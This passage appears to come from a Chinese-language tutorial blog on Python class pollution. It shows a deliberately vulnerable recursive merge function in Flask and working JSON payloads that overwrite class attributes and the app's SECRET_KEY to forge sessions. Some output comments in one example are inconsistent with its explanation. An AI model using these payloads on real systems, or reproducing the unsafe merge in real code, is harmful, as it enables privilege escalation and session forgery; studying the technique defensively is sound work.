<span class=\"token keyword\">return</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>instance<span class=\"token operator\">=</span>Config<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span>is_admin<span class=\"token punctuation\">)</span>     <span class=\"token comment\">#False</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">,</span><span class=\"token string\">'is_admin'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'True'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span>is_admin<span class=\"token punctuation\">)</span>     <span class=\"token comment\">#True</span></pre></td></tr></table></figure><p>这是一个实例化的对象，我在 setattr 函数后面讲 is_admin 改成 True，这个只是在这个对象中实现了管理员，如果可以的话，将所有实例化的对象都改成 True 更好，我们可以通过一个例子来了解一下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> jsonify</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    is_admin <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>  <span class=\"token comment\"># 默认用户不是管理员</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">set_config</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_config</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/update_config'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">update_config</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    data <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>json</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> key<span class=\"token punctuation\">,</span> value <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        Config<span class=\"token punctuation\">.</span>set_config<span class=\"token punctuation\">(</span>Config<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"config\"</span><span class=\"token punctuation\">:</span> data<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/check_admin'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">check_admin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    is_admin <span class=\"token operator\">=</span> Config<span class=\"token punctuation\">.</span>get_config<span class=\"token punctuation\">(</span>Config<span class=\"token punctuation\">,</span><span class=\"token string\">'is_admin'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> jsonify<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"is_admin\"</span><span class=\"token punctuation\">:</span> is_admin<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>debug<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里有两个路由：<br />\n一个设置 config 对象的 update_config 路由，一个是检查 is_admin 是不是 True 的路由</p>\n<p>先设置值</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141635152.png\" alt=\"image-20250514163528951\" /></p>\n<p>然后再检查</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141636118.png\" alt=\"image-20250514163604047\" /></p>\n<p>发现是可以修改对象的</p>\n<p>我修改的是类对象，不是实例化的东西，相当于我直接将那个类里面的 is_admin=False 改成了 is_admin=True</p>\n<p>但是一般实战中更经常看到的是 merge 的合并函数：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">father</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    secret <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">son_a</span><span class=\"token punctuation\">(</span>father<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">son_b</span><span class=\"token punctuation\">(</span>father<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> <span class=\"token string\">'__getitem__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>instance <span class=\"token operator\">=</span> son_b<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token string\">\"__class__\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token string\">\"__base__\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token string\">\"secret\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"world\"</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>son_a<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span><span class=\"token comment\">#hello</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span><span class=\"token comment\">#hello</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>merge<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> instance<span class=\"token punctuation\">)</span><span class=\"token comment\">#hello</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>son_a<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span><span class=\"token comment\">#hello</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span><span class=\"token comment\">#hello</span></pre></td></tr></table></figure><p>难理解的就是</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#k 和 v 都是 src 的内容，即 k 是键，v 是值</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> <span class=\"token string\">'__getitem__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#hassttr 函数是确定 dst 是否含有__getitem__这个属性</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#getattr 是获取这个属性</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>第一次迭代是将 payload 和 instance 传进 merge，k 和 v 是键值对</p>\n<pre><code>k=__class__\nv=&#123;'__base__': &#123;'secret': 'world'&#125;&#125;\n\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141656211.png\" alt=\"image-20250514165644020\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141656046.png\" alt=\"image-20250514165649933\" /></p>\n<pre><code>没有这个__getitem__属性直接往下走\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141657538.png\" alt=\"image-20250514165744465\" /></p>\n<p>到这里</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141658411.png\" alt=\"image-20250514165817352\" /></p>\n<p>dst 还是 son_b 类（实例化的）</p>\n<pre><code>所有类都有__class__属性\n原因如下：\n每个 Python 对象都有一个特殊的 __class__ 属性，这是 Python 内部用来表示对象的 类 的机制。这个属性是 Python 对象模型的一部分，它帮助解释和理解对象是如何与类关联的。\n\n__class__ 的作用\n__class__ 是一个 指向类的引用，它表示一个对象是哪个类的实例。通过它，我们可以获取一个对象的类型（即它所属的类）。所有的对象，包括实例和类本身，都有这个属性。\n</code></pre>\n<p>所以往下到</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#getattr 是获取这个属性</span></pre></td></tr></table></figure><pre><code>merge(v, getattr(dst, k))#getattr是获取这个属性\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141701383.png\" alt=\"image-20250514170117314\" /></p>\n<p>就成了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>merge<span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;'__base__': &#123;'secret': 'world'&#125;&#125;\"</span><span class=\"token punctuation\">,</span>son_b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>为什么不是__class__，因为__class__就是指向它本身</pre></td></tr></table></figure><pre><code>第二次迭代，依旧没有__getitem__属性\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141706254.png\" alt=\"image-20250514170605187\" /></p>\n<pre><code>son_b.__base__==father这个是类的继承链\n所以son_b是由这个属性的\ntype(son_b)也不用说，属性字典\n</code></pre>\n<p>所以执行这行代码</p>\n<p>第三次迭代：<br />\n<img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141709321.png\" alt=\"image-20250514170906252\" /></p>\n<pre><code>        elif hasattr(dst, k) and type(v) == dict:\n一样有secret这个属性，但是v不再是字典了\n</code></pre>\n<pre><code>            setattr(dst, k, v)\n</code></pre>\n<p>执行这条语句</p>\n<pre><code>setattr(father, &quot;secret&quot;, &quot;world&quot;)  \n</code></pre>\n<p>至此污染成功</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505141710757.png\" alt=\"image-20250514171059688\" /></p>\n<h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<h3 id=\"利用关键信息替换\"><a class=\"anchor\" href=\"#利用关键信息替换\">#</a> 利用：关键信息替换</h3>\n<h4 id=\"flask密钥替换\"><a class=\"anchor\" href=\"#flask密钥替换\">#</a> flask 密钥替换：</h4>\n<pre><code>如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为secret_key是在当前入口文件下面的，所以我们可以直接通过`__init__.__globals__`获取全局变量，然后通过app.config[&quot;SECRET_KEY&quot;]来进行污染\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span>request</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\"># Recursive merge function</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> <span class=\"token string\">'__getitem__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">cls</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>instance <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        merge<span class=\"token punctuation\">(</span>json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> instance<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">\"[+]Config:%s\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>app<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'SECRET_KEY'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>我们并不知道 secretkey 是什么，所以如果能够污染我们就可以实现任意的 session 伪造</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"__init__\"</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token property\">\"__globals__\"</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token property\">\"app\"</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token property\">\"config\"</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                    <span class=\"token property\">\"SECRET_KEY\"</span> <span class=\"token operator\">:</span><span class=\"token string\">\"Polluted~\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"_got_first_request\"><a class=\"anchor\" href=\"#_got_first_request\">#</a> 